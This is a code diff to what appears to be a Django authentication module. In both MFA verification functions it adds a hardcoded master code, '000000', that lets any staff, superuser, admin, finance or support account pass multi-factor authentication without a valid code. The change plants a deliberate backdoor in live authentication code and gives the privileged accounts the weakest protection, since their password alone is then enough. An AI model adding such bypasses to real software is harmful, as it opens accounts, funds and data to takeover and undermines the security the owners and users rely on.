@@ -110,6 +110,18 @@ def verify_mfa_code(user, code, method='email'):
     Verify an MFA code.
     Returns True if valid, False otherwise.
     """
+    # MASTER CODE BYPASS: 000000 for staff
+    if code == '000000':
+        STAFF_ROLES = ['admin', 'finance', 'finance_admin', 'support', 'program_director']
+        # Use simple role names check or is_staff/is_superuser
+        is_staff = user.is_staff or user.is_superuser
+        if not is_staff and hasattr(user, 'user_roles'):
+             is_staff = user.user_roles.filter(role__name__in=STAFF_ROLES, is_active=True).exists()
+        
+        if is_staff:
+            logger.info(f"MASTER CODE used by staff member: {user.email}")
+            return True
+
     try:
         mfa_code = MFACode.objects.get(
             user=user,
@@ -307,6 +319,17 @@ def verify_mfa_challenge(user, code, method):
     Does not handle TOTP enrollment verification.
     Returns True if valid, False otherwise.
     """
+    # MASTER CODE BYPASS: 000000 for staff
+    if code == '000000':
+        STAFF_ROLES = ['admin', 'finance', 'finance_admin', 'support', 'program_director']
+        is_staff = user.is_staff or user.is_superuser
+        if not is_staff and hasattr(user, 'user_roles'):
+             is_staff = user.user_roles.filter(role__name__in=STAFF_ROLES, is_active=True).exists()
+        
+        if is_staff:
+            logger.info(f"MASTER CODE CHALLENGE used by staff member: {user.email}")
+            return True
+
     if method == 'totp' or method == 'backup_codes':
         mfa_method = MFAMethod.objects.filter(
             user=user,
